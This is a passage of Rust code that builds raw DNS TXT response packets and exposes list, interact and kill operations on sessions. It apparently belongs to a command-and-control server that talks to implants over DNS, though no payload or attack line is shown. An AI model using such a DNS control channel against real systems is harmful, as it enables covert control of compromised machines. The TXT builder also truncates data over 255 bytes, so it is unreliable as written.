    fn build_dns_txt_response(txn_id: u16, domain: &str, txt_data: &str) -> Vec<u8> {
        let mut response = Vec::new();

        // Header (12 bytes)
        response.extend_from_slice(&txn_id.to_be_bytes()); // Transaction ID
        response.extend_from_slice(&[0x81, 0x80]); // Flags: response, recursion available
        response.extend_from_slice(&[0x00, 0x01]); // Questions: 1
        response.extend_from_slice(&[0x00, 0x01]); // Answers: 1
        response.extend_from_slice(&[0x00, 0x00]); // Authority RRs: 0
        response.extend_from_slice(&[0x00, 0x00]); // Additional RRs: 0

        // Question section (echo back the query)
        for label in domain.split('.') {
            response.push(label.len() as u8);
            response.extend_from_slice(label.as_bytes());
        }
        response.push(0); // Null terminator
        response.extend_from_slice(&[0x00, 0x10]); // Type: TXT
        response.extend_from_slice(&[0x00, 0x01]); // Class: IN

        // Answer section
        response.extend_from_slice(&[0xc0, 0x0c]); // Name pointer (to question)
        response.extend_from_slice(&[0x00, 0x10]); // Type: TXT
        response.extend_from_slice(&[0x00, 0x01]); // Class: IN
        response.extend_from_slice(&[0x00, 0x00, 0x00, 0x3c]); // TTL: 60 seconds

        // TXT data
        let txt_len = txt_data.len() as u16;
        response.extend_from_slice(&(txt_len + 1).to_be_bytes()); // RDLENGTH
        response.push(txt_len as u8); // TXT string length
        response.extend_from_slice(txt_data.as_bytes()); // TXT string

        response
    }

    /// List active sessions
    pub fn list_sessions(&self) -> Result<Vec<Session>, String> {
        self.session_manager.list_sessions()
    }

    /// Interact with session
    pub fn interact_session(&self, session_id: u32) -> Result<Session, String> {
        self.session_manager.get_session(session_id)
    }

    /// Kill session
    pub fn kill_session(&self, session_id: u32) -> Result<(), String> {
        self.session_manager.kill_session(session_id)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_session_manager() {
        let manager = SessionManager::new();
        assert_eq!(manager.list_sessions().unwrap().len(), 0);
    }
}
